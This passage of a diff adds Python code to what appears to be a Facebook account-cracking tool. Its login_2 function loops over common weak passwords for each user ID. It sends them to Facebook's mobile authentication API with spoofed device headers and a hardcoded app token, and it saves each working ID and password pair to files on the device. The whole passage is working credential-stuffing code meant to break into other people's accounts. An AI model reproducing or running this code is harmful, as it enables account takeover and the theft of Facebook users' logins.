+                break
+            elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
+                print(f"\r\r\x1b[1;37m>\x1b[38;5;196m├Ч\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mA H B\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
+                open('/sdcard/A H B-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
+                oks.append(uid)
+                break
+        loop += 1
+    except Exception:
+        time.sleep(5)
+
+
+def login_2(uid):
+    """
+    Login attempt method 2.
+    """
+    sys.stdout.write(f"\r\r\x1b[1;37m>\x1b[38;5;196m+\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mA H B-M2\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
+    
+    for pw in ('123456', '123123', '1234567', '12345678', '123456789'):
+        try:
+            with requests.Session() as session:
+                headers = {
+                    'x-fb-connection-bandwidth': str(rr(20000000, 29999999)),
+                    'x-fb-sim-hni': str(rr(20000, 40000)),
+                    'x-fb-net-hni': str(rr(20000, 40000)),
+                    'x-fb-connection-quality': 'EXCELLENT',
+                    'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
+                    'user-agent': window1(),
+                    'content-type': 'application/x-www-form-urlencoded',
+                    'x-fb-http-engine': 'Liger'
+                }
+                url = f"https://b-api.facebook.com/method/auth.login?format=json&email={str(uid)}&password={str(pw)}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true"
+                po = session.get(url, headers=headers).json()
+                if 'session_key' in str(po):
+                    print(f"\r\r\x1b[1;37m>\x1b[38;5;196m├Ч\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mA H B\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
+                    open('/sdcard/A H B-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
+                    oks.append(uid)
+                    break
+                elif 'session_key' in po:
+                    print(f"\r\r\x1b[1;37m>\x1b[38;5;196m├Ч\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mA H B\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
+                    open('/sdcard/A H B-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
+                    oks.append(uid)
+                    break
+        except Exception as e:
+            pass
+    loop += 1
+
+if __name__ == '__main__':
+    BNG_71_()
